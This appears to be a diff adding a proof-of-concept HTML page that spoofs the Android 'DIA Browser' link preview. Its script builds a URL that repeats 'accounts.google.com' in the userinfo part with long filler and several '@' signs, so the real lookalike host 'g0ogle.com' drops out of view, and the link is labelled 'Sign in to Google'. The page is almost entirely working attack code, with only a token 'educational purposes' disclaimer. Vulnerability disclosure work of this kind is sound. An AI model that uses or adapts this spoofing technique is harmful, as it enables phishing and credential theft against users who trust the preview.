@@ -1,0 +1,39 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DIA Browser Link Preview Spoofing PoC</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+        a { color: #1a73e8; text-decoration: none; font-size: 18px; }
+        a:hover { text-decoration: underline; }
+        .warning { color: red; font-size: 14px; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <h1>DIA Browser Link Preview Spoofing PoC</h1>
+    <p>Long-press the link below to trigger the DIA Browser link preview on Android.</p>
+    <a id="spoofedLink" href="#">Loading spoofed link...</a>
+    <p class="warning">Warning: This is a proof of concept for educational purposes. Do not use for malicious intent.</p>
+
+    <script>
+        // Function to generate a long userinfo string with a trusted domain
+        function generateSpoofedURL() {
+            const trustedDomain = "accounts.google.com";
+            const realDomain = "g0ogle.com"; // Replace with attacker-controlled domain
+            const filler = "x".repeat(100); // Long string to push real domain out of view
+            const path = "/ServiceLogin?continue=https://www.google.com"; // Mimics legitimate path
+            const spoofedUserinfo = `${trustedDomain}${filler}@`.repeat(5); // Multiple @ for obfuscation
+            return `http://${spoofedUserinfo}${realDomain}${path}`;
+        }
+
+        // Set the spoofed URL in the link
+        const linkElement = document.getElementById("spoofedLink");
+        const spoofedURL = generateSpoofedURL();
+        linkElement.setAttribute("href", spoofedURL);
+        linkElement.textContent = "Sign in to Google";
+    </script>
+</body>
+</html>
